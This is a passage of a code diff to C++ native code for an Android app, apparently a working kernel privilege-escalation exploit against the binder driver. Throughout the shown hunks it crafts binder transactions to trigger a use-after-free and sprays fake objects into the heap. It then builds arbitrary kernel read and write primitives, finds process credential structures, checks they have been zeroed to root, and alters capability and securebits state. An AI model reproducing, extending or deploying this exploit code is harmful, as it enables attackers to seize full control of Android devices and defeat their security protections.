+Java_com_vandam_prism_NativeBridge_decrementNodeBatchRange(
+        JNIEnv* environment, jclass, jstring directory_string,
+        jint start, jint count, jboolean notify_predrain) {
+    bool aligned = count > 0 && count < kCohortSize &&
+            count % kDisclosureCveBatchSize == 0;
+    bool first = start == 0 && aligned && notify_predrain;
+    bool second = start > 0 && aligned &&
+            start % kDisclosureCveBatchSize == 0 &&
+            start + count == kCohortSize && !notify_predrain;
+    if (directory_string == nullptr || (!first && !second)) {
+        return environment->NewStringUTF(
+                "status=fail stage=node-decrement-range reason=arguments");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=node-decrement-range reason=directory");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    std::vector<BatchToken> tokens = read_token_inventory(
+            directory + "/epitem-node-tokens.bin");
+    std::set<BatchToken> unique(tokens.begin(), tokens.end());
+    bool sequence_valid = false;
+    {
+        std::lock_guard<std::mutex> lock(g_split_disclosure_mutex);
+        sequence_valid = first
+                ? g_split_disclosure_tokens.empty()
+                : g_split_disclosure_tokens == tokens;
+    }
+    std::string ready = read_text_file(
+            directory + "/epitem-leak.unread-ready");
+    std::size_t cpu_position = ready.find("cpu=");
+    int cpu = cpu_position == std::string::npos ? -1 :
+            std::atoi(ready.c_str() + cpu_position + 4);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    if (cpu >= 0 && cpu < CPU_SETSIZE) {
+        CPU_SET(cpu, &set);
+    }
+    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
+            sched_setaffinity(0, sizeof(set), &set) == 0;
+    bool valid = tokens.size() == kCohortSize &&
+            unique.size() == kCohortSize && sequence_valid && pinned &&
+            g_owner_handle > 0;
+    int fd = valid ? duplicate_binder_fd() : -1;
+    int submitted = 0;
+    int decrement_transactions = 0;
+    while (fd >= 0 && submitted < count) {
+        int batch_count = std::min(
+                kDisclosureCveBatchSize, count - submitted);
+        CveVictim victims[kDisclosureCveBatchSize] {};
+        for (int index = 0; index < batch_count; ++index) {
+            const BatchToken& token = tokens[start + submitted + index];
+            victims[index] = {token.ptr, token.cookie};
+        }
+        CveResult result = send_decrement_batch(
+                fd, g_owner_handle, victims, batch_count);
+        if (result.ioctl_result != 0 || !result.failed_reply ||
+                result.dead_reply) {
+            break;
+        }
+        submitted += batch_count;
+        ++decrement_transactions;
+    }
+    if (fd >= 0) {
+        close(fd);
+    }
+
+    bool decrement_notified = !first ||
+            (submitted == count && write_text_file(
+                    directory + "/epitem-nodes-decremented",
+                    "status=pass nodes=" + std::to_string(count) +
+                            " split=1"));
+    std::string predrain_release;
+    if (first && decrement_notified && wait_for_file(
+            directory + "/kmalloc-predrain.released", 12000)) {
+        predrain_release = read_text_file(
+                directory + "/kmalloc-predrain.released");
+    }
+    bool predrain_released = !first ||
+            predrain_release.rfind("status=pass", 0) == 0;
+    int pressure_errno = 0;
+    int pressure_objects = 0;
+    int pressure_fds_closed = 0;
+    bool pressure_released = true;
+    bool pass = valid && submitted == count && decrement_notified &&
+            predrain_released && pressure_released;
+    {
+        std::lock_guard<std::mutex> lock(g_split_disclosure_mutex);
+        if (first && pass) {
+            g_split_disclosure_tokens = tokens;
+        } else if (second) {
+            g_split_disclosure_tokens.clear();
+        }
+    }
+    char state[448];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=node-decrement-range start=%d count=%d"
+            " tokens=%zu unique=%zu submitted=%d transactions=%d"
+            " batch_size=%d cpu=%d pinned=%d sequence=%d"
+            " decrement_notified=%d predrain_released=%d"
+            " pressure_objects=%d pressure_fds_closed=%d"
+            " pressure_errno=%d pressure_deferred=1 read_enabled=0",
+            pass ? "pass" : "fail", start, count, tokens.size(),
+            unique.size(), submitted, decrement_transactions,
+            kDisclosureCveBatchSize, cpu, pinned ? 1 : 0,
+            sequence_valid ? 1 : 0, decrement_notified ? 1 : 0,
             predrain_released ? 1 : 0, pressure_objects,
             pressure_fds_closed, pressure_errno);
     return environment->NewStringUTF(state);
@@ -9935,7 +11023,7 @@ Java_com_vandam_prism_NativeBridge_prepareFakeNodeCheck(
                   &controlled_handle, sizeof(controlled_handle));
     int release_result = fd >= 0 ? write_binder_commands(
             fd, release_commands, sizeof(release_commands)) : -1;
-    usleep(500000);
+    usleep(20000);
 
     CveResult decrement;
     if (release_result == 0) {
@@ -10946,6 +12034,22 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     std::string directory(characters);
     environment->ReleaseStringUTFChars(directory_string, characters);
+    const std::array<const char*, 6> overlap_files {
+            "controlled-free.enable.0",
+            "controlled-read.enable.0",
+            "controlled-read.go.0",
+            "controlled-read.continue.0",
+            "raw-target.victim-work.0",
+            "raw-target.reading.0"};
+    for (const char* name : overlap_files) {
+        std::string path = directory + "/" + name;
+        errno = 0;
+        if (unlink(path.c_str()) != 0 && errno != ENOENT) {
+            return environment->NewStringUTF(
+                    "status=fail stage=arb-read-prepare"
+                    " reason=overlap-clean");
+        }
+    }
     {
         std::lock_guard<std::mutex> lock(g_raw_reply_signal_mutex);
         if (g_terminal_fd_retirement_gate.load(
@@ -11014,7 +12118,8 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
             sched_setaffinity(0, sizeof(set), &set) == 0;
     int prefilled = 0;
     bool spray_prepared = pinned && prepare_fake_control_spray(
-            payload.data(), &prefilled, true, kFakeControlStagedCount,
+            payload.data(), &prefilled, true,
+            kFakeControlInitialStagedCount,
             nullptr, 0, 0, kFakeControlInitialSprayCount);
     int fd = spray_prepared ? duplicate_binder_fd() : -1;
     split.fd = fd;
@@ -11042,7 +12147,7 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     bool activated = false;
     if (split.thread_created && coordinator_pinned) {
-        activated = activate_split_decrement_spray(&split);
+        activated = activate_split_decrement_spray(&split, directory);
     }
     bool post_go = split.go_issued;
     bool joined = false;
@@ -11093,11 +12198,15 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 !context_quarantined &&
                 split.exact_write && split.staged_wake &&
                 split.generation_valid && split.staged_stable &&
+                split.gates_prepared && split.target_read_ready &&
+                split.read_go && split.boundary_signal &&
+                split.victim_work_ready &&
+                split.read_continue &&
                 split.global_published && split.all_entered &&
                 split.blocked == split.expected &&
                 split.expected == kFakeControlInitialSprayCount &&
-                split.staged_expected == kFakeControlStagedCount &&
-                split.staged_active == kFakeControlStagedCount &&
+                split.staged_expected == kFakeControlInitialStagedCount &&
+                split.staged_active == kFakeControlInitialStagedCount &&
                 split.read_result == 0 && split.exact_read &&
                 split.read_tid == split.tid &&
                 split.write_enter_cpu == 2 && split.write_return_cpu == 2 &&
@@ -11118,8 +12227,8 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     bool reboot_required = context_quarantined ||
             (post_go && !candidate_pass);
     int gate_error = 0;
-    bool free_gate = false;
-    bool enabled = false;
+    bool free_gate = split.gates_prepared;
+    bool enabled = split.gates_prepared;
     bool gate_unlinked_free = false;
     bool gate_unlinked_read = false;
     char state[4096];
@@ -11144,7 +12253,10 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 " generation=0x%" PRIx64 " staged_generation=%d"
                 " generation_captured=%d generation_valid=%d expected=%d"
                 " staged_expected=%d staged_active=%d staged_wake=%d"
-                " staged_state2=%d staged_stable=%d global_published=%d"
+                " staged_state2=%d staged_stable=%d"
+                " target_read_ready=%d read_go=%d boundary_signal=%d"
+                " victim_work_ready=%d read_continue=%d"
+                " global_published=%d"
                 " all_entered=%d all_state2=%d blocked=%d"
                 " read_rc=%d read_errno=%d read_consumed=%" PRIu64
                 " read_write_consumed=%" PRIu64
@@ -11181,6 +12293,11 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 split.staged_expected, split.staged_active,
                 split.staged_wake ? 1 : 0, split.staged_state2,
                 split.staged_stable ? 1 : 0,
+                split.target_read_ready ? 1 : 0,
+                split.read_go ? 1 : 0,
+                split.boundary_signal ? 1 : 0,
+                split.victim_work_ready ? 1 : 0,
+                split.read_continue ? 1 : 0,
                 split.global_published ? 1 : 0, split.all_entered ? 1 : 0,
                 split.all_state2, split.blocked, split.read_result,
                 split.read_errno,
@@ -11229,23 +12346,9 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     bool pass = false;
     if (candidate_pass && telemetry_complete) {
-        const std::string free_path =
-                directory + "/controlled-free.enable.0";
-        const std::string read_path =
-                directory + "/controlled-read.enable.0";
-        free_gate = write_text_file(free_path, "0");
-        enabled = free_gate && write_text_file(
-                read_path, "status=pass stage=arb-read-enable victim=0");
-        if (!free_gate || !enabled) {
-            gate_error = free_gate ? 2 : 1;
-            gate_unlinked_free = unlink(free_path.c_str()) == 0;
-            gate_unlinked_read = unlink(read_path.c_str()) == 0;
-            free_gate = false;
-            enabled = false;
-            reboot_required = true;
-        } else {
-            pass = true;
-        }
+        pass = split.gates_prepared && split.target_read_ready &&
+                split.read_go && split.victim_work_ready &&
+                split.read_continue;
     }
     if (!pass && candidate_pass && !telemetry_complete) {
         reboot_required = true;
@@ -11525,7 +12628,7 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
     bool donor_live = g_direct_terminal_cleanup &&
             g_direct_write_step == 6
             ? validate_terminal_swapped_donor()
-            : validate_live_security_target();
+            : validate_live_security_target(true);
     if (!g_direct_security_repair || g_direct_write_step < 1 ||
         g_direct_write_step > final_step ||
         address != root_write_target(g_direct_write_step) ||
@@ -11583,7 +12686,7 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
     if (valid &&
         (g_direct_write_step == 1 || g_direct_write_step == 3)) {
         std::uint64_t snapshot_repair = UINT64_MAX;
-        valid = validate_zero_root_cred_snapshot(
+        valid = validate_zero_root_cred_snapshot_fast(
                 g_security_target_task, g_security_target_cred,
                 g_security_target_real_cred_slot,
                 g_security_target_cred_slot,
@@ -11594,35 +12697,10 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
         g_last_write_observed_usage = static_cast<std::uint32_t>(
                 g_zero_snapshot_header);
     } else if (valid) {
-        std::uint64_t header = 0;
-        std::uint32_t uid = UINT32_MAX;
-        std::uint32_t sgid = UINT32_MAX;
-        std::uint64_t effective_ids = UINT64_MAX;
-        std::uint64_t fs_ids = UINT64_MAX;
-        valid = reliable_read64_allow_zero(
+        valid = validate_zero_identity_fields_fast(
                 g_security_target_cred,
-                g_security_target_cred_slot,
-                g_security_target_cred, &header) &&
-                static_cast<std::uint32_t>(header) == expected_usage &&
-                static_cast<std::uint32_t>(header >> 32U) == 0 &&
-                arbitrary_read32_allow_zero(
-                        g_security_target_cred + 4,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &uid) && uid == 0 &&
-                arbitrary_read32_allow_zero(
-                        g_security_target_cred + 16,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &sgid) && sgid == 0 &&
-                reliable_read64_allow_zero(
-                        g_security_target_cred + 20,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &effective_ids) &&
-                effective_ids == 0 &&
-                reliable_read64_allow_zero(
-                        g_security_target_cred + 28,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &fs_ids) && fs_ids == 0;
-        g_last_write_observed_usage = static_cast<std::uint32_t>(header);
+                g_security_target_cred_slot, expected_usage);
+        g_last_write_observed_usage = valid ? expected_usage : 0;
     }
     return valid;
 }
@@ -11741,11 +12819,11 @@ Java_com_vandam_prism_NativeBridge_prepareRawNullWrite(
                 donor_repair == expected_repair;
         if (direct_state_valid &&
             (g_direct_write_step == 1 || g_direct_write_step == 3)) {
-            direct_state_valid = validate_live_security_target();
+            direct_state_valid = validate_live_security_target(true);
             for (int snapshot = 0;
                  direct_state_valid && snapshot < 2; ++snapshot) {
                 std::uint64_t snapshot_repair = UINT64_MAX;
-                direct_state_valid = validate_zero_root_cred_snapshot(
+                direct_state_valid = validate_zero_root_cred_snapshot_fast(
                         g_security_target_task,
                         g_security_target_cred,
                         g_security_target_real_cred_slot,
@@ -12277,7 +13355,11 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
         record_raw_unlink_stage(progress_fd,
                 "stage=isolated-lock-acquired victim=%d worker=%d", victim,
                 worker);
-        if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
+        bool retirement_state_valid =
+                g_raw_isolated_state == IsolatedRetirementState::kProved ||
+                (victim == 0 && g_raw_isolated_state ==
+                        IsolatedRetirementState::kReferencesReleased);
+        if (retirement_state_valid &&
             g_raw_controlled_free_pending_victim == -1 &&
             g_raw_controlled_unlinks.count(victim) == 0) {
             controlled_generation = g_raw_isolated_generation;
@@ -12296,8 +13378,12 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             return false;
         }
         std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
+        bool retirement_state_valid =
+                g_raw_isolated_state == IsolatedRetirementState::kProved ||
+                (victim == 0 && g_raw_isolated_state ==
+                        IsolatedRetirementState::kReferencesReleased);
         bool valid = g_raw_isolated_generation == controlled_generation &&
-                g_raw_isolated_state == IsolatedRetirementState::kProved &&
+                retirement_state_valid &&
                 g_raw_controlled_free_pending_victim == -1 &&
                 g_raw_controlled_unlinks.count(victim) == 0;
         if (valid) {
@@ -12522,6 +13608,33 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             g_selected_epoll_watched_fd = candidates[0].watched_fd;
             g_arb_read_ready = true;
         }
+        int selected_epitem_index = -1;
+        int selected_epitem_kind = 0;
+        if (located && candidates.size() == 1) {
+            std::lock_guard<std::mutex> lock(g_epitem_mutex);
+            auto shared = std::find(g_epitem_fds.begin(),
+                                    g_epitem_fds.end(),
+                                    g_selected_epoll_fd);
+            if (shared != g_epitem_fds.end()) {
+                selected_epitem_index = static_cast<int>(
+                        shared - g_epitem_fds.begin()) - 1;
+                selected_epitem_kind = selected_epitem_index <
+                                kEpitemPreDrainCount
+                        ? 1 : 2;
+                if (selected_epitem_kind == 2) {
+                    selected_epitem_index -= kEpitemPreDrainCount;
+                }
+            } else {
+                auto probe = std::find(g_file_probe_epoll_fds.begin(),
+                                       g_file_probe_epoll_fds.end(),
+                                       g_selected_epoll_fd);
+                if (probe != g_file_probe_epoll_fds.end()) {
+                    selected_epitem_index = static_cast<int>(
+                            probe - g_file_probe_epoll_fds.begin());
+                    selected_epitem_kind = 3;
+                }
+            }
+        }
         __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                             "unlink checkpoint=epoll-selected located=%d candidates=%zu",
                             located ? 1 : 0, candidates.size());
@@ -12660,6 +13773,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 " released=%d expected_release=%d poison=%d"
                 " initial=0x%x expected=0x%x matching_files=%d"
                 " selected_fd=%d selected_watched_fd=%d"
+                " selected_epitem_kind=%d selected_epitem_index=%d"
                 " candidates=%zu handoff=%d pre_free_indexed=%d"
                 " post_free_node_read=0 retained_worker=%d"
                 " canonical=%d original_owner=%d one_poison=%d"
@@ -12671,7 +13785,8 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 released, spray_expected_release,
                 poisoned_control_count(), value,
                 expected_a, matching_files, g_selected_epoll_fd,
-                g_selected_epoll_watched_fd,
+                g_selected_epoll_watched_fd, selected_epitem_kind,
+                selected_epitem_index,
                 node_candidates.size(), victim0_handoff ? 1 : 0,
                 pre_free_indexed ? 1 : 0, worker, canonical ? 1 : 0,
                 original_owner ? 1 : 0, one_poison ? 1 : 0,
@@ -12707,7 +13822,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
               expected_value == g_terminal_vendor_inode_security));
     std::uint64_t zero_control_address = g_security_target_cred_slot;
     std::uint64_t zero_expected_control = g_security_target_cred;
-    bool read_back = g_direct_security_repair
+    bool read_back = g_direct_security_repair && expected_value == 0
             ? reliable_read64_allow_zero(
                     address, zero_control_address,
                     zero_expected_control, &value)
@@ -12729,9 +13844,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
     int expected_release = batch_retained ? 0 : expected_before - 1;
     bool release_valid = released == expected_release;
     std::uint64_t target_effective = UINT64_MAX;
-    bool target_effective_read = g_credential_target_external &&
-            reliable_read64(g_arb_cred_address + 20,
-                            &target_effective);
+    bool target_effective_read = false;
     bool direct_sequence_valid = true;
     bool collateral_read = false;
     bool collateral_valid = true;
@@ -12768,7 +13881,9 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
         std::uint64_t expected_collateral = completion_terminal_label
                 ? address
                 : completion_repair || completion_quarantine ? 0 : address;
-        collateral_read = completion_terminal_label
+        collateral_read = completion_repair
+                ? (collateral = value, read_back)
+                : expected_collateral != 0
                 ? reliable_read64(collateral_address, &collateral)
                 : reliable_read64_allow_zero(
                         collateral_address, zero_control_address,
@@ -12848,13 +13963,14 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                  attempt < 16 && !final_donor_valid; ++attempt) {
                 ++final_donor_attempts;
                 std::uint64_t final_repair = UINT64_MAX;
-                final_donor_live_valid = validate_live_security_target();
+                final_donor_live_valid =
+                        validate_live_security_target(true);
                 final_donor_live_stage = g_live_security_target_stage;
                 final_donor_live_after_valid = false;
                 final_donor_live_after_stage = 0;
                 final_donor_snapshot_stage = 0;
                 final_donor_snapshot_valid = final_donor_live_valid &&
-                        validate_zero_root_cred_snapshot(
+                        validate_zero_root_cred_snapshot_fast(
                                 g_security_target_task,
                                 g_security_target_cred,
                                 g_security_target_real_cred_slot,
@@ -12866,7 +13982,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 }
                 if (final_donor_snapshot_valid) {
                     final_donor_live_after_valid =
-                            validate_live_security_target();
+                            validate_live_security_target(true);
                     final_donor_live_after_stage =
                             g_live_security_target_stage;
                 }
@@ -12934,7 +14050,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
     }
     bool acknowledged = record_controlled_unlink(pass);
     pass = pass && acknowledged;
-    char state[1664];
+    char state[1728];
     std::snprintf(state, sizeof(state),
             "status=%s stage=null-write-complete victim=%d worker=%d"
             " target=0x%" PRIx64 " value=0x%" PRIx64
@@ -12967,7 +14083,8 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             " final_donor_zero_address=0x%" PRIx64
             " final_donor_zero_rc=%d"
             " final_donor_zero_errno=%d"
-            " released=%d expected_release=%d poison=%d"
+            " released=%d expected_release=%d release_us=%" PRId64
+            " poison=%d"
             " internal_write_misses=%d used_victims=%d"
             " successful_writes=%d"
             " reusable_pool_retired=%d"
@@ -13003,7 +14120,8 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             g_zero_read_address,
             g_zero_read_result,
             g_zero_read_errno,
-            released, expected_release, poisoned_control_count(),
+            released, expected_release, g_fake_control_release_microseconds,
+            poisoned_control_count(),
             g_internal_write_misses, g_write_victims_used,
             g_write_successes,
             reusable_pool_retired ? 1 : 0,
@@ -13212,11 +14330,11 @@ Java_com_vandam_prism_NativeBridge_adoptCredentialTarget(
                     &expected_user_ns) &&
             kernel_address(expected_user_ns);
     bool first_snapshot_read = ids_valid && user_ns_valid &&
-            read_credential_snapshot(
+            read_credential_snapshot_fast(
                     target_cred, target_task + kTaskCredOffset,
                     first_snapshot, &first_sid);
     bool second_snapshot_read = first_snapshot_read &&
-            read_credential_snapshot(
+            read_credential_snapshot_fast(
                     target_cred, target_task + kTaskCredOffset,
                     second_snapshot, &second_sid);
     bool snapshots_equal = second_snapshot_read &&
@@ -13382,8 +14500,7 @@ Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
                     g_cached_current_binder_proc,
                     g_security_target_handle)
             : find_security_target_binder_proc();
-    std::uint64_t repeated_target_proc = g_security_target_handle > 0
-            ? target_proc : find_security_target_binder_proc();
+    bool repeated_target_proc = security_target_proc_is_live(target_proc);
     std::uint32_t target_pid = 0;
     std::uint64_t target_cred = 0;
     std::uint64_t target_real_cred = 0;
@@ -13393,7 +14510,7 @@ Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
     std::uint32_t sid = 0;
     bool pass = kernel_pointer(g_cached_current_binder_proc) &&
             kernel_pointer(target_proc) &&
-            target_proc == repeated_target_proc &&
+            repeated_target_proc &&
             arbitrary_read32(target_proc + 64, &target_pid) &&
             target_pid == static_cast<std::uint32_t>(g_security_target_pid) &&
             reliable_read64(target_proc + 72, &target_task) &&
@@ -13956,13 +15073,13 @@ Java_com_vandam_prism_NativeBridge_prepareDirectSecurityTarget(
         }
     }
     bool live_target = !repair ||
-            (cap_seed_valid && validate_live_security_target());
+            (cap_seed_valid && validate_live_security_target(true));
     for (; repair && live_target && valid_snapshots < 2 &&
          repair_attempts < 32;
          ++repair_attempts) {
         std::uint64_t snapshot_repair = UINT64_MAX;
         bool snapshot = cached_donor_slots &&
-                validate_zero_root_cred_snapshot(
+                validate_zero_root_cred_snapshot_fast(
                         g_security_target_task,
                         g_security_target_cred,
                         donor_real_cred_slot, donor_cred_slot,
@@ -14336,6 +15453,74 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_prepareProbeShellCredential(
+        JNIEnv* environment, jclass) {
+    bool leader = syscall(SYS_gettid) == getpid();
+    bool shell_before = getuid() == 2000 && geteuid() == 2000 &&
+            getgid() == 2000 && getegid() == 2000;
+    errno = 0;
+    int securebits_before = leader && shell_before
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
+    int securebits_before_errno = securebits_before >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_before = securebits_before >= 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_before_errno = ambient_before >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_lower = ambient_before == 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_LOWER, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_lower_errno = ambient_lower == 0 ? 0 : errno;
+    errno = 0;
+    int credential_result = ambient_lower == 0
+            ? static_cast<int>(syscall(
+                    SYS_setresuid, 2000, 2000, 2000)) : -1;
+    int credential_errno = credential_result == 0 ? 0 : errno;
+    errno = 0;
+    int securebits_after = credential_result == 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
+    int securebits_after_errno = securebits_after >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_after = securebits_after >= 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_after_errno = ambient_after >= 0 ? 0 : errno;
+    bool shell_after = getuid() == 2000 && geteuid() == 2000 &&
+            getgid() == 2000 && getegid() == 2000;
+    constexpr int kExpectedShellSecurebits = 47;
+    bool pass = leader && shell_before &&
+            securebits_before == kExpectedShellSecurebits &&
+            ambient_before == 0 && ambient_lower == 0 &&
+            credential_result == 0 &&
+            securebits_after == securebits_before && ambient_after == 0 &&
+            shell_after;
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=probe-shell-credential leader=%d"
+            " pid=%d tid=%d securebits_before=%d"
+            " securebits_before_errno=%d credential=%d"
+            " credential_errno=%d ambient_before=%d"
+            " ambient_before_errno=%d ambient_lower=%d"
+            " ambient_lower_errno=%d securebits_after=%d"
+            " securebits_after_errno=%d ambient_after=%d"
+            " ambient_after_errno=%d shell_before=%d shell_after=%d",
+            pass ? "pass" : "fail", leader ? 1 : 0, getpid(),
+            static_cast<int>(syscall(SYS_gettid)), securebits_before,
+            securebits_before_errno, credential_result, credential_errno,
+            ambient_before, ambient_before_errno, ambient_lower,
+            ambient_lower_errno, securebits_after, securebits_after_errno,
+            ambient_after, ambient_after_errno,
+            shell_before ? 1 : 0, shell_after ? 1 : 0);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
 Java_com_vandam_prism_NativeBridge_createPrivateShellCredential(
         JNIEnv* environment, jclass) {
     (void)write(STDOUT_FILENO,
@@ -14550,7 +15735,7 @@ Java_com_vandam_prism_NativeBridge_installCtlbufRescuePlan(
             "status=pass stage=ctlbuf-rescue-plan nonce=" +
             std::string(g_command_watchdog_nonce) +
             " module_sha256="
-            "f0be198e4a4d2da59691156593b463ec138ab96ea6558fb66f2a1551386343c3"
+            "ff4e063cc09b926c09b55a777705d386734a1d1db6428d3e41081486c07bbb86"
             " params=";
     bool exact_prefix = plan.size() > prefix.size() &&
             plan.size() < 3072 && plan.compare(0, prefix.size(), prefix) == 0 &&
@@ -17479,7 +18664,7 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
     int isolated_retired = isolated_proof.retired;
     int binder_controlled_unlinks = isolated_proof.controlled_unlinks;
     int expected_holder_retirement = isolated_proof.raw_contexts
-            ? 128 : kIsolatedRetirementCount;
+            ? 512 : kIsolatedRetirementCount;
     constexpr int kExpectedTerminalCtlbufs = kCtlbufRepairCount;
     bool isolated_retirement_proved = isolated_proof.proved;
     bool inactive_spray_state = !g_fake_control_active &&
@@ -18069,7 +19254,7 @@ Java_com_vandam_prism_NativeBridge_terminalCtlbufRescuePlan(
     int length = std::snprintf(state, sizeof(state),
             "status=pass stage=ctlbuf-rescue-plan nonce=%s"
             " module_sha256="
-            "f0be198e4a4d2da59691156593b463ec138ab96ea6558fb66f2a1551386343c3"
+            "ff4e063cc09b926c09b55a777705d386734a1d1db6428d3e41081486c07bbb86"
             " params=tids=%s nodes=%s"
             " kernel_base=0x%" PRIx64
             " expected_tgid=%d helper_tid=%d"
@@ -18385,11 +19570,13 @@ Java_com_vandam_prism_NativeBridge_releaseFakeNodeSpray(
         g_null_write_armed = false;
         g_null_write_armed_victim = -1;
     }
-    char state[256];
+    char state[320];
     std::snprintf(state, sizeof(state),
             "status=%s stage=fake-control-release joined=%d expected=%d"
+            " duration_us=%" PRId64
             " write_miss=%d internal_write_misses=%d used_victims=%d",
             pass ? "pass" : "fail", joined, expected,
+            g_fake_control_release_microseconds,
             write_miss ? 1 : 0, g_internal_write_misses,
             g_write_victims_used);
     return environment->NewStringUTF(state);
@@ -18723,6 +19910,58 @@ Java_com_vandam_prism_NativeBridge_inspectRemoteBinderParcel(
     return environment->NewStringUTF(state);
 }
 
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_exportParcelTemplate(
+        JNIEnv* environment, jclass, jobject java_parcel, jstring java_path) {
+    constexpr std::uint64_t kMagic = UINT64_C(0x31504d544d535250);
+    constexpr std::uint32_t kVersion = 1;
+    constexpr char kPathPrefix[] =
+            "/data/user/0/com.vandam.prism/files/raw-route-";
+    PlatformParcelView view;
+    const char* path = java_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(java_path, nullptr);
+    bool path_valid = path != nullptr &&
+            std::strncmp(path, kPathPrefix, sizeof(kPathPrefix) - 1) == 0 &&
+            std::strstr(path + sizeof(kPathPrefix) - 1, "/") == nullptr;
+    bool parcel_valid = inspect_platform_parcel(
+            environment, java_parcel, &view) &&
+            view.data_size <= UINT32_MAX &&
+            view.object_count <= UINT32_MAX;
+    int fd = path_valid && parcel_valid
+            ? open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC |
+                         O_NOFOLLOW, 0600)
+            : -1;
+    std::uint32_t data_size = static_cast<std::uint32_t>(view.data_size);
+    std::uint32_t object_count =
+            static_cast<std::uint32_t>(view.object_count);
+    std::uint32_t reserved = 0;
+    bool pass = fd >= 0 &&
+            write_all(fd, &kMagic, sizeof(kMagic)) &&
+            write_all(fd, &kVersion, sizeof(kVersion)) &&
+            write_all(fd, &data_size, sizeof(data_size)) &&
+            write_all(fd, &object_count, sizeof(object_count)) &&
+            write_all(fd, &reserved, sizeof(reserved)) &&
+            write_all(fd, view.object_offsets,
+                    view.object_count * sizeof(binder_size_t)) &&
+            write_all(fd, view.data, view.data_size) &&
+            fsync(fd) == 0;
+    int saved_errno = pass ? 0 : errno;
+    if (fd >= 0 && close(fd) != 0) {
+        pass = false;
+        saved_errno = errno;
+    }
+    if (path != nullptr) {
+        environment->ReleaseStringUTFChars(java_path, path);
+    }
+    char state[256];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=parcel-template-export data=%zu objects=%zu"
+            " errno=%d",
+            pass ? "pass" : "fail", view.data_size, view.object_count,
+            saved_errno);
+    return environment->NewStringUTF(state);
+}
+
 namespace {
 
 struct RetainedRawBinderRoute {
@@ -18731,12 +19970,24 @@ struct RetainedRawBinderRoute {
     binder_uintptr_t callback_buffer = 0;
     binder_uintptr_t callback_pointer = 0;
     binder_uintptr_t callback_cookie = 0;
+    int target_handle = -1;
+    int exported_handle = -1;
+    std::uint64_t exported_pointer = 0;
+    std::uint64_t exported_cookie = 0;
+    bool victim_export_started = false;
+    bool victim_export_passed = false;
+    bool victim_retired = false;
+    std::thread victim_export_thread;
     std::vector<std::uint32_t> holder_handles;
     std::vector<binder_handle_cookie> death_notifications;
 };
 
 std::mutex g_retained_raw_route_mutex;
 std::vector<RetainedRawBinderRoute> g_retained_raw_routes;
+std::mutex g_holder_cohort_mutex;
+std::unique_ptr<prism::primitive::HolderCohort> g_holder_cohort;
+std::mutex g_victim_cohort_mutex;
+std::unique_ptr<prism::primitive::VictimCohort> g_victim_cohort;
 
